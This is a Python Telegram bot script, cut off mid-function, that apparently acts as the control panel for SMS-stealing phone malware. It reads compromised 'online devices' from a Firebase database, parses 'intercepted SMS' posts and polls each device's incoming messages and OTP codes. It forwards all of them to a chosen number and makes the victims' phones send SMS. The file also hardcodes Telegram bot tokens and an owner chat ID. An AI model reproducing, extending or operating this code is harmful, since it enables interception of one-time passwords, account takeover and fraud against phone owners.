#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
from datetime import datetime
from typing import Dict, Any, Optional, List, Union
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# BOT TOKENS
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8766524282:AAFKvbFa8hYrEiXiuQACf-F7EsBPrCCB0Tw")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "8919120322:AAESIjOGBP9I5JpAw7kYBWGTQjV619CPA-I")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "8912251548"))

# ============================
# BOT NAME
# ============================
BOT_NAME = "<b>𝗔𝗡𝗬 𝗔𝗨𝗧𝗢 𝗕𝗢𝗧</b>"

# ============================
# USER CONFIG
# ============================
USER_CONFIG_FILE = "user_config.json"
user_configs = {}
last_otp = {}
structure_cache = {}

def load_user_configs():
    global user_configs, last_otp
    if os.path.exists(USER_CONFIG_FILE):
        with open(USER_CONFIG_FILE, "r") as f:
            user_configs = json.load(f)
        for uid, cfg in user_configs.items():
            if "last_otp_value" in cfg:
                last_otp[uid] = cfg["last_otp_value"]
        logger.info(f"✅ Loaded configs for {len(user_configs)} users")
    else:
        user_configs = {}

def save_user_configs():
    with open(USER_CONFIG_FILE, "w") as f:
        json.dump(user_configs, f, indent=2)

load_user_configs()

# ============================
# CONVERSATION STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10

# ============================
# UNIVERSAL URL HANDLER
# ============================
class FirebaseURLHandler:
    """Handle all types of Firebase URLs"""
    
    @staticmethod
    def normalize_url(url: str) -> str:
        url = url.strip()
        if url.endswith('.json'):
            url = url[:-5]
        if url.endswith('/'):
            url = url[:-1]
        parsed = urlparse(url)
        if not parsed.scheme:
            url = 'https://' + url
        return url
    
    @staticmethod
    def build_url(base_url: str, path: str = "") -> str:
        base = FirebaseURLHandler.normalize_url(base_url)
        if not path or path == "/" or path == "":
            return f"{base}.json"
        path = path.strip('/')
        return f"{base}/{path}.json"
    
    @staticmethod
    def is_valid_url(url: str) -> bool:
        try:
            parsed = urlparse(url)
            return bool(parsed.netloc) and bool(parsed.scheme)
        except:
            return False

# ============================
# MESSAGE PARSER - ALL FORMATS
# ============================
class MessageParser:
    """Parse ALL types of messages from Telegram channel"""
    
    @staticmethod
    def parse_message(text: str) -> Dict[str, Any]:
        if not text:
            return None
        
        result = {
            'phone': None,
            'message': None,
            'otp': None,
            'type': 'unknown',
            'raw': text
        }
        
        # ========== FORMAT 1: Standard SMS ==========
        to_match = re.search(r"To:\s*([\d\+]+)", text, re.IGNORECASE)
        msg_match = re.search(r"Message:\s*(.+)", text, re.IGNORECASE)
        if to_match and msg_match:
            result['phone'] = to_match.group(1).strip()
            result['message'] = msg_match.group(1).strip()
            result['type'] = 'standard_sms'
            otp = MessageParser.extract_otp(result['message'])
            if otp:
                result['otp'] = otp
            return result
        
        # ========== FORMAT 2: Intercepted SMS ==========
        phone_patterns = [
            r"To\s*\(Tap to copy\):\s*\n?\s*([\d\+]+)",
            r"To:\s*\n?\s*([\d\+]+)",
            r"Phone:\s*\n?\s*([\d\+]+)",
            r"Number:\s*\n?\s*([\d\+]+)",
            r"📱.*?\n\s*([\d\+]{10,15})",
        ]
        for pattern in phone_patterns:
            phone_match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if phone_match:
                result['phone'] = phone_match.group(1).strip()
                break
        
        body_patterns = [
            r"Body\s*\(Tap to copy\):\s*\n?\s*(.+?)(?:\n\n|\n$|$)",
            r"Body:\s*\n?\s*(.+?)(?:\n\n|\n$|$)",
            r"Message:\s*\n?\s*(.+?)(?:\n\n|\n$|$)",
            r"Text:\s*\n?\s*(.+?)(?:\n\n|\n$|$)",
            r"📱.*?\n.*?\n.*?\n\s*(.+?)(?:\n\n|\n$|$)",
        ]
        for pattern in body_patterns:
            body_match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if body_match:
                result['message'] = body_match.group(1).strip()
                break
        
        if result['phone'] and result['message']:
            result['type'] = 'intercepted_sms'
            otp = MessageParser.extract_otp(result['message'])
            if otp:
                result['otp'] = otp
            return result
        
        # ========== FORMAT 3: Phone + OTP ==========
        lines = text.strip().split('\n')
        if len(lines) >= 2:
            phone_match = re.match(r"^\+?[\d\s\-\(\)]{10,15}$", lines[0].strip())
            if phone_match:
                result['phone'] = lines[0].strip()
                second_line = lines[1].strip()
                if second_line:
                    result['message'] = second_line
                    otp = MessageParser.extract_otp(second_line)
                    if otp:
                        result['otp'] = otp
                    result['type'] = 'phone_otp'
                    return result
        
        # ========== FORMAT 4: Pure OTP ==========
        if re.match(r"^\d{4,8}$", text.strip()):
            result['otp'] = text.strip()
            result['message'] = text.strip()
            result['type'] = 'pure_otp'
            return result
        
        # ========== FORMAT 5: OTP with Text ==========
        otp = MessageParser.extract_otp(text)
        if otp:
            result['otp'] = otp
            result['message'] = text
            result['type'] = 'otp_with_text'
            return result
        
        # ========== FORMAT 6: Plain Text ==========
        if text.strip():
            result['message'] = text.strip()
            result['type'] = 'plain_text'
            phone_match = re.search(r"\+?\d{10,15}", text)
            if phone_match:
                result['phone'] = phone_match.group()
            return result
        
        return None
    
    @staticmethod
    def extract_otp(text: str) -> Optional[str]:
        if not text:
            return None
        patterns = [
            r'\b(\d{4,8})\b',
            r'OTP[:\s]+(\d{4,8})',
            r'otp[:\s]+(\d{4,8})',
            r'code[:\s]+(\d{4,8})',
            r'verification[:\s]+(\d{4,8})',
            r'pin[:\s]+(\d{4,8})',
            r'token[:\s]+(\d{4,8})',
            r'is\s+(\d{4,8})',
            r':\s*(\d{4,8})',
            r'-\s*(\d{4,8})',
            r'[A-Z0-9]{6,12}',
        ]
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                otp = match.group(1).strip()
                if (otp.isdigit() and 4 <= len(otp) <= 8) or (len(otp) >= 6 and len(otp) <= 12):
                    return otp
        return None

# ============================
# DEVICE PARSER - ONLINE ONLY
# ============================
class DeviceParser:
    @staticmethod
    def parse_devices(data: Dict, path: str) -> Dict:
        """Parse ONLY online devices"""
        devices = {}
        for device_id, info in data.items():
            if not isinstance(info, dict):
                continue
            
            # Check if device is ONLINE
            is_online = False
            for status_key in ['status', 'online', 'active', 'connected']:
                if status_key in info:
                    val = info[status_key]
                    if val in [True, 'true', 1, '1', 'online', 'active']:
                        is_online = True
                        break
            
            # SKIP OFFLINE DEVICES - ONLY SHOW ONLINE
            if not is_online:
                continue
            
            # Get device name
            model_name = 'Unknown'
            for name_key in ['modelName', 'name', 'deviceName', 'device', 'model', 'title']:
                if name_key in info and info[name_key]:
                    model_name = str(info[name_key])
                    break
            if model_name == 'Unknown':
                model_name = f"Device_{device_id[:8]}"
            
            # SIM Detection
            sims = []
            sim_found = False
            
            if 'sims' in info and isinstance(info['sims'], list):
                sims = info['sims']
                sim_found = True
            elif 'sim' in info and isinstance(info['sim'], list):
                sims = info['sim']
                sim_found = True
            elif 'phoneNumber' in info:
                sims = [{'simSlotIndex': info.get('simSlotIndex', 0), 'phoneNumber': info.get('phoneNumber', 'Unknown')}]
                sim_found = True
            else:
                for key, value in info.items():
                    if 'sim' in key.lower() and isinstance(value, dict):
                        if 'phoneNumber' in value:
                            sims.append({'simSlotIndex': value.get('simSlotIndex', 0), 'phoneNumber': value.get('phoneNumber', 'Unknown')})
                            sim_found = True
                    elif 'sim' in key.lower() and isinstance(value, list):
                        for item in value:
                            if isinstance(item, dict) and 'phoneNumber' in item:
                                sims.append({'simSlotIndex': item.get('simSlotIndex', 0), 'phoneNumber': item.get('phoneNumber', 'Unknown')})
                                sim_found = True
            
            if not sim_found:
                sims = [{'simSlotIndex': 0, 'phoneNumber': f'NO_SIM_{device_id[:6]}', 'is_fallback': True, 'no_sim': True}]
            
            cleaned_sims = []
            for sim in sims:
                if isinstance(sim, dict):
                    phone = sim.get('phoneNumber') or sim.get('number') or sim.get('phone') or 'Unknown'
                    if phone in [None, 'Unknown', 'N/A', '']:
                        phone = f'DEVICE_{device_id[:6]}'
                        sim['is_fallback'] = True
                    cleaned_sims.append({
                        'simSlotIndex': sim.get('simSlotIndex', 0),
                        'phoneNumber': str(phone),
                        'is_fallback': sim.get('is_fallback', False),
                        'no_sim': sim.get('no_sim', False)
                    })
                else:
                    cleaned_sims.append({'simSlotIndex': 0, 'phoneNumber': f'DEFAULT_{device_id[:6]}', 'is_fallback': True, 'no_sim': True})
            
            if not cleaned_sims:
                cleaned_sims = [{'simSlotIndex': 0, 'phoneNumber': f'DEFAULT_{device_id[:6]}', 'is_fallback': True, 'no_sim': True}]
            
            devices[device_id] = {
                'modelName': model_name,
                'status': True,  # Always True since we filtered
                'sims': cleaned_sims,
                'path': path,
                'has_sim': sim_found,
                'raw_data': info
            }
        return devices

# ============================
# ENHANCED FIREBASE HELPERS
# ============================
def firebase_get(user_id: str, path: str = "") -> Any:
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return None
    base_url = cfg["firebase_url"]
    url_handler = FirebaseURLHandler()
    try:
        url = url_handler.build_url(base_url, path)
        headers = {'Accept': 'application/json', 'Content-Type': 'application/json'}
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            return resp.json()
        return None
    except Exception as e:
        logger.error(f"Firebase GET error: {e}")
        return None

def firebase_put(user_id: str, path: str, data: Any) -> bool:
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return False
    base_url = cfg["firebase_url"]
    url_handler = FirebaseURLHandler()
    try:
        url = url_handler.build_url(base_url, path)
        headers = {'Accept': 'application/json', 'Content-Type': 'application/json'}
        resp = requests.put(url, json=data, headers=headers, timeout=15)
        if resp.status_code in [200, 201]:
            logger.info(f"✅ PUT successful: {path}")
            return True
        return False
    except Exception as e:
        logger.error(f"Firebase PUT error: {e}")
        return False

# ============================
# AUTO-DETECT STRUCTURE
# ============================
async def detect_structure(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    
    await update.message.reply_text("<b>🔍 Auto-detecting database structure...</b>", parse_mode='HTML')
    
    structure = await auto_detect_structure_enhanced(user_id)
    
    if structure:
        structure_cache[user_id] = structure
        report = f"<b>✅ Structure Detected!</b>\n\n"
        report += f"<b>📊 Nodes Found:</b>\n"
        
        for node_type in ['devices_path', 'messages_path', 'otp_path', 'users_path', 'config_path']:
            if structure.get(node_type):
                report += f"• <b>{node_type.replace('_path', '').title()}</b>: <code>{structure[node_type]}</code>\n"
        
        report += f"\n<b>💡 Bot will automatically use these paths.</b>"
        await update.message.reply_text(report, parse_mode='HTML')
        
        user_configs[user_id]['detected_structure'] = structure
        save_user_configs()
    else:
        await update.message.reply_text(
            "<b>❌ Could not auto-detect structure.\nTry using /custompath to manually set paths.</b>",
            parse_mode='HTML'
        )

async def auto_detect_structure_enhanced(user_id: str) -> Optional[Dict]:
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return None
    
    structure = {}
    root_data = firebase_get(user_id, "")
    
    if root_data and isinstance(root_data, dict):
        for key, value in root_data.items():
            if isinstance(value, dict):
                if any(k in value for k in ['status', 'modelName', 'sims', 'phoneNumber', 'online']):
                    structure['devices_path'] = key
                elif any(k in value for k in ['type', 'message', 'text', 'body', 'from', 'to']):
                    structure['messages_path'] = key
                elif any(k in value for k in ['username', 'email', 'name', 'phone', 'uid']):
                    structure['users_path'] = key
            elif isinstance(value, (str, int, float)):
                str_val = str(value)
                if str_val.isdigit() and len(str_val) >= 4:
                    structure['otp_path'] = key
    
    if 'devices_path' not in structure:
        for path in ['clients', 'devices', 'device', 'client', 'phones']:
            if firebase_get(user_id, path):
                structure['devices_path'] = path
                break
    
    if 'messages_path' not in structure:
        for path in ['messages', 'message', 'sms', 'inbox', 'history']:
            if firebase_get(user_id, path):
                structure['messages_path'] = path
                break
    
    if 'otp_path' not in structure:
        for path in ['otp', 'code', 'verification', 'token', 'auth']:
            if firebase_get(user_id, path) is not None:
                structure['otp_path'] = path
                break
    
    return structure if structure else None

# ============================
# DYNAMIC DEVICES - ONLINE ONLY
# ============================
def get_dynamic_devices(user_id: str) -> Dict:
    """Get ONLY online devices"""
    cfg = user_configs.get(str(user_id))
    if not cfg:
        return {}
    
    devices = {}
    detected = cfg.get('detected_structure', {})
    devices_path = detected.get('devices_path')
    
    if devices_path:
        data = firebase_get(user_id, devices_path)
        if data and isinstance(data, dict):
            devices = DeviceParser.parse_devices(data, devices_path)
            if devices:
                return devices
    
    for path in ['clients', 'devices', 'device', 'client', 'phones']:
        data = firebase_get(user_id, path)
        if data and isinstance(data, dict):
            devices = DeviceParser.parse_devices(data, path)
            if devices:
                return devices
    
    root_data = firebase_get(user_id, "")
    if root_data and isinstance(root_data, dict):
        for key, value in root_data.items():
            if isinstance(value, dict):
                device_indicators = ['status', 'modelName', 'sims', 'phoneNumber', 'online', 'device']
                if any(indicator in value for indicator in device_indicators):
                    # Check if online
                    is_online = False
                    for status_key in ['status', 'online', 'active', 'connected']:
                        if status_key in value:
                            val = value[status_key]
                            if val in [True, 'true', 1, '1', 'online', 'active']:
                                is_online = True
                                break
                    if is_online:
                        devices = DeviceParser.parse_devices({key: value}, key)
                        if devices:
                            return devices
    
    return devices

def get_dynamic_messages(user_id: str, device_id: str) -> Dict:
    cfg = user_configs.get(str(user_id))
    if not cfg:
        return {}
    
    detected = cfg.get('detected_structure', {})
    messages_path = detected.get('messages_path')
    
    if messages_path:
        data = firebase_get(user_id, f"{messages_path}/{device_id}")
        if data and isinstance(data, dict):
            return data
    
    for path in ['messages', 'message', 'sms', 'inbox', 'history']:
        data = firebase_get(user_id, f"{path}/{device_id}")
        if data and isinstance(data, dict):
            return data
    
    return {}

def get_dynamic_otp(user_id: str) -> Optional[Any]:
    cfg = user_configs.get(str(user_id))
    if not cfg:
        return None
    
    detected = cfg.get('detected_structure', {})
    otp_path = detected.get('otp_path')
    
    if otp_path:
        return firebase_get(user_id, otp_path)
    
    for path in ['otp', 'code', 'verification', 'token', 'auth']:
        data = firebase_get(user_id, path)
        if data is not None:
            return data
    
    root_data = firebase_get(user_id, "")
    if root_data and isinstance(root_data, dict):
        for key, value in root_data.items():
            if isinstance(value, (str, int, float)):
                str_val = str(value)
                if str_val.isdigit() and 4 <= len(str_val) <= 8:
                    return value
                if any(indicator in key.lower() for indicator in ['otp', 'code', 'pin', 'token']):
                    return value
    
    return None

# ============================
# DEVICE COMMANDS - ONLINE ONLY
# ============================
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    
    await update.message.reply_text("<b>🔍 Scanning for online devices...</b>", parse_mode='HTML')
    
    devices = get_dynamic_devices(user_id)
    
    if not devices:
        await update.message.reply_text(
            "<b>❌ No online devices found.\n\n"
            "💡 Tips:\n"
            "• Make sure device is connected\n"
            "• Check if status is 'true' in database\n"
            "• Try /detect to scan structure\n"
            "• Try /custompath to set path manually</b>",
            parse_mode='HTML'
        )
        return
    
    keyboard = []
    for device_id, data in devices.items():
        model = data.get('modelName', 'Unknown')
        has_sim = data.get('has_sim', False)
        sim_count = len(data.get('sims', []))
        sim_icon = "📶" if has_sim else "⚠️"
        label = f"🟢 {model} ({device_id[:6]}...) [{sim_count} SIMs]"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"dev_{device_id}")])
    
    keyboard.append([InlineKeyboardButton("🔄 Refresh", callback_data="refresh_devices")])
    
    await update.message.reply_text(
        f"<b>✅ {len(devices)} Online Device(s) Found:</b>\n"
        f"🟢 Online | 📶 Has SIM | ⚠️ No SIM\n\n"
        f"<b>👇 Select your device:</b>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(update.effective_user.id)
    
    if query.data == "refresh_devices":
        await devices_command(update, context)
        await query.delete_message()
        return
    
    device_id = query.data.replace("dev_", "")
    devices = get_dynamic_devices(user_id)
    device_data = devices.get(device_id)
    
    if not device_data:
        await query.edit_message_text("<b>❌ Device not found.</b>", parse_mode='HTML')
        return
    
    sims = device_data.get("sims", [])
    model = device_data.get("modelName", "Unknown")
    has_sim = device_data.get("has_sim", False)
    
    sim_status = "📶 Has SIM" if has_sim else "⚠️ No SIM (Fallback)"
    
    if not sims:
        sims = [{'simSlotIndex': 0, 'phoneNumber': f'DEFAULT_{device_id[:6]}', 'is_fallback': True, 'no_sim': True}]
    
    keyboard = []
    for sim in sims:
        slot = sim.get("simSlotIndex", "?")
        phone = sim.get("phoneNumber", "Unknown")
        is_fallback = sim.get("is_fallback", False) or sim.get("no_sim", False)
        
        if is_fallback:
            label = f"⚠️ SIM {slot} - [Fallback]"
        else:
            label = f"📶 SIM {slot} - {phone}"
        
        keyboard.append([InlineKeyboardButton(label, callback_data=f"sim_{device_id}_{slot}_{phone}")])
    
    await query.edit_message_text(
        f"<b>📱 Device:</b> <code>{model}</code>\n"
        f"<b>🆔 ID:</b> <code>{device_id}</code>\n"
        f"<b>Status:</b> 🟢 Online\n"
        f"<b>SIM Status:</b> {sim_status}\n\n"
        f"<b>Choose SIM:</b>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(update.effective_user.id)
    parts = query.data.split("_")
    
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
        return
    
    device_id = parts[1]
    slot = parts[2]
    phone = parts[3]
    
    set_selected(user_id, device_id, slot, phone)
    
    devices = get_dynamic_devices(user_id)
    device_data = devices.get(device_id, {})
    model = device_data.get("modelName", "Unknown")
    
    is_fallback = "NO_SIM" in phone or "DEFAULT_" in phone or "DEVICE_" in phone
    
    status_msg = f"<b>✅ Device Selected!</b>\n\n📱 Model: <code>{model}</code>\n🆔 ID: <code>{device_id}</code>\n📶 SIM Slot: <code>{slot}</code>\n📞 Phone: <code>{phone}</code>"
    
    if is_fallback:
        status_msg += f"\n\n⚠️ <b>Fallback Mode Active</b> - Device will work without SIM number."
    
    status_msg += f"\n\n✅ Ready. Use /setotp to set forwarding number."
    
    await query.edit_message_text(status_msg, parse_mode='HTML')

def set_selected(user_id, device_id, sim_slot, sim_phone):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["selectedDevice"] = {
            "deviceId": device_id,
            "simSlotIndex": sim_slot,
            "simPhoneNumber": sim_phone,
            "is_fallback": "NO_SIM" in sim_phone or "DEFAULT_" in sim_phone or "DEVICE_" in sim_phone
        }
        initialize_processed_keys(user_id, device_id)
        save_user_configs()

def initialize_processed_keys(user_id: str, device_id: str):
    cfg = user_configs.get(user_id)
    if not cfg:
        return
    try:
        msgs = get_dynamic_messages(user_id, device_id)
        keys = list(msgs.keys()) if msgs and isinstance(msgs, dict) else []
    except:
        keys = []
    cfg["processed_keys"] = keys
    cfg["processed_device"] = device_id
    save_user_configs()

# ============================
# CHANNEL MESSAGE HANDLER
# ============================
async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post:
        return
    
    channel_id = update.channel_post.chat_id
    user_id = get_user_by_channel(channel_id)
    if not user_id:
        return
    
    text = update.channel_post.text
    if not text:
        return
    
    parsed = MessageParser.parse_message(text)
    if not parsed:
        return
    
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await send_error_notification(user_id, "No device selected. Use /devices")
        return
    
    device_id = selected["deviceId"]
    from_number = selected.get("simPhoneNumber", "Unknown")
    
    if parsed['phone'] and parsed['message']:
        send_sms_command(user_id, device_id, parsed['phone'], parsed['message'], from_number)
        await send_confirmation(user_id, parsed['phone'], parsed['message'])
    elif parsed['phone'] and parsed['otp']:
        send_sms_command(user_id, device_id, parsed['phone'], parsed['otp'], from_number)
        await send_confirmation(user_id, parsed['phone'], parsed['otp'])
    elif parsed['otp']:
        otp_number = get_otp_number(user_id)
        if otp_number:
            send_sms_command(user_id, device_id, otp_number, parsed['otp'], from_number)
            await send_confirmation(user_id, otp_number, parsed['otp'])
        else:
            await send_error_notification(user_id, "OTP received but no forwarding number. Use /setotp")
    elif parsed['message']:
        phone_match = re.search(r"\+?\d{10,15}", parsed['message'])
        if phone_match:
            phone = phone_match.group()
            otp_match = re.search(r"\b\d{4,8}\b", parsed['message'])
            if otp_match:
                send_sms_command(user_id, device_id, phone, otp_match.group(), from_number)
                await send_confirmation(user_id, phone, otp_match.group())

def get_user_by_channel(channel_id):
    for uid, cfg in user_configs.items():
        if cfg.get("channel_id") == channel_id:
            return uid
    return None

def get_selected(user_id):
    cfg = user_configs.get(str(user_id))
    return cfg.get("selectedDevice", {}) if cfg else {}

def get_otp_number(user_id):
    cfg = user_configs.get(str(user_id))
    return cfg.get("otpNumber") if cfg else None

def send_sms_command(user_id, device_id, to_number, message, from_number):
    cfg = user_configs.get(str(user_id))
    detected = cfg.get('detected_structure', {})
    devices_path = detected.get('devices_path', 'clients')
    
    if from_number and ("NO_SIM" in from_number or "DEFAULT_" in from_number or "DEVICE_" in from_number):
        from_number = f"DEVICE_{device_id[:6]}"
    
    firebase_put(user_id, f"{devices_path}/{device_id}/webhookEvent/sendSms", {
        "to": to_number,
        "message": message,
        "from": from_number,
        "isSended": False
    })

async def send_confirmation(user_id, phone, message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": int(user_id),
            "text": f"✅ <b>SMS Sent!</b>\n📞 To: <code>{phone}</code>\n💬 Message: <code>{message[:100]}</code>",
            "parse_mode": "HTML"
        }
        requests.post(url, json=data, timeout=5)
    except Exception as e:
        logger.error(f"Confirmation send failed: {e}")

async def send_error_notification(user_id, error_message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": int(user_id),
            "text": f"⚠️ <b>Error:</b>\n{error_message}",
            "parse_mode": "HTML"
        }
        requests.post(url, json=data, timeout=5)
    except Exception as e:
        logger.error(f"Error notification failed: {e}")

# ============================
# SETUP COMMANDS
# ============================
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"{BOT_NAME} <b>SETUP</b>\n\n"
        f"<b>📌 Step 1/2</b>: Send your <b>Firebase URL</b>.\n\n"
        f"<b>Supported Formats:</b>\n"
        f"• https://project.firebaseio.com\n"
        f"• https://project.firebaseio.com/.json\n"
        f"• https://custom-domain.com\n\n"
        f"Type /cancel to abort.",
        parse_mode='HTML'
    )
    return URL

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    url_handler = FirebaseURLHandler()
    normalized_url = url_handler.normalize_url(url)
    
    if not url_handler.is_valid_url(normalized_url):
        await update.message.reply_text("<b>❌ Invalid URL format.</b>", parse_mode='HTML')
        return URL
    
    context.user_data["firebase_url"] = normalized_url
    await update.message.reply_text(
        f"<b>✅ URL accepted!</b>\n<code>{normalized_url}</code>\n\n"
        f"<b>📌 Step 2/2</b>: Send your <b>Channel ID</b> (numeric).",
        parse_mode='HTML'
    )
    return CHANNEL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("<b>❌ Channel ID must be a number.</b>", parse_mode='HTML')
        return CHANNEL
    
    user_configs[user_id] = {
        "firebase_url": context.user_data["firebase_url"],
        "channel_id": channel_id,
        "selectedDevice": {},
        "otpNumber": None,
        "processed_keys": [],
        "processed_device": None,
        "detected_structure": {}
    }
    save_user_configs()
    
    await update.message.reply_text(
        f"{BOT_NAME} <b>SETUP COMPLETE!</b>\n\n"
        f"<b>Next Steps:</b>\n"
        f"1️⃣ /detect - Auto-detect structure\n"
        f"2️⃣ /devices - Select device (Online only)\n"
        f"3️⃣ /setotp - Set forwarding number",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("<b>❌ Setup cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# SET OTP
# ============================
async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    
    if context.args:
        number = context.args[0]
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text("<b>❌ Invalid number.</b>", parse_mode='HTML')
            return
        set_otp_number(user_id, number)
        await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
        return
    
    await update.message.reply_text(
        "<b>📞 Send phone number:</b>\nExample: <code>+919876543210</code>",
        parse_mode='HTML'
    )
    return WAITING_OTP_NUMBER

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await update.message.reply_text("<b>❌ Invalid number. Try again.</b>", parse_mode='HTML')
        return WAITING_OTP_NUMBER
    set_otp_number(user_id, number)
    await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
    return ConversationHandler.END

def set_otp_number(user_id, number):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["otpNumber"] = number
        save_user_configs()

# ============================
# RESET FORWARD
# ============================
async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text("<b>❌ No device selected. Use /devices first.</b>", parse_mode='HTML')
        return
    device_id = selected["deviceId"]
    initialize_processed_keys(user_id, device_id)
    await update.message.reply_text(f"<b>✅ Reset successful!</b>", parse_mode='HTML')

# ============================
# POLLING THREADS
# ============================
def poll_otp_updates():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                otp_number = get_otp_number(user_id)
                if not otp_number:
                    continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"):
                    continue
                
                current_otp = get_dynamic_otp(user_id)
                if current_otp is None:
                    continue
                
                current_otp_str = str(current_otp).strip()
                if user_id not in last_otp or last_otp[user_id] != current_otp_str:
                    last_otp[user_id] = current_otp_str
                    cfg = user_configs.get(user_id)
                    if cfg:
                        cfg["last_otp_value"] = current_otp_str
                        save_user_configs()
                    
                    device_id = selected["deviceId"]
                    from_number = selected.get("simPhoneNumber", "Unknown")
                    send_sms_command(user_id, device_id, otp_number, current_otp_str, from_number)
                    logger.info(f"✅ Auto OTP sent: {current_otp_str}")
        except Exception as e:
            logger.error(f"OTP polling error: {e}")
        time.sleep(1)

def poll_incoming_messages():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                forward_number = get_otp_number(user_id)
                if not forward_number:
                    continue
                
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"):
                    continue
                
                device_id = selected["deviceId"]
                from_number = selected.get("simPhoneNumber", "Unknown")
                cfg = user_configs.get(str(user_id), {})
                processed_keys = cfg.get("processed_keys", [])
                processed_device = cfg.get("processed_device")
                
                if processed_device != device_id:
                    initialize_processed_keys(str(user_id), device_id)
                    processed_keys = cfg.get("processed_keys", [])
                
                processed_set = set(processed_keys)
                device_msgs = get_dynamic_messages(user_id, device_id)
                
                if not device_msgs or not isinstance(device_msgs, dict):
                    continue
                
                new_keys = []
                for msg_key, msg_data in device_msgs.items():
                    if not isinstance(msg_data, dict):
                        continue
                    
                    msg_type = msg_data.get("type", "").lower()
                    if msg_type and msg_type not in ["incoming", "received", "sms"]:
                        continue
                    
                    if msg_key not in processed_set:
                        msg_text = msg_data.get("message") or msg_data.get("text") or msg_data.get("body") or ""
                        if msg_text and len(str(msg_text)) > 3:
                            send_sms_command(user_id, device_id, forward_number, str(msg_text), from_number)
                            new_keys.append(msg_key)
                
                if new_keys:
                    processed_keys.extend(new_keys)
                    cfg["processed_keys"] = processed_keys
                    save_user_configs()
        except Exception as e:
            logger.error(f"Incoming forward error: {e}")
        time.sleep(2)

# ============================
# CUSTOM PATH
# ============================
async def custom_path_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    
    if context.args and len(context.args) >= 2:
        path_type = context.args[0].lower()
        path_value = context.args[1]
        valid_types = ['devices', 'messages', 'otp', 'users', 'config']
        
        if path_type not in valid_types:
            await update.message.reply_text(f"<b>❌ Valid types: {', '.join(valid_types)}</b>", parse_mode='HTML')
            return
        
        cfg = user_configs.get(user_id)
        if not cfg.get('detected_structure'):
            cfg['detected_structure'] = {}
        cfg['detected_structure'][f'{path_type}_path'] = path_value
        save_user_configs()
        
        await update.message.reply_text(f"<b>✅ {path_type.title()} path set to <code>{path_value}</code></b>", parse_mode='HTML')
        return
    
    await update.message.reply_text(
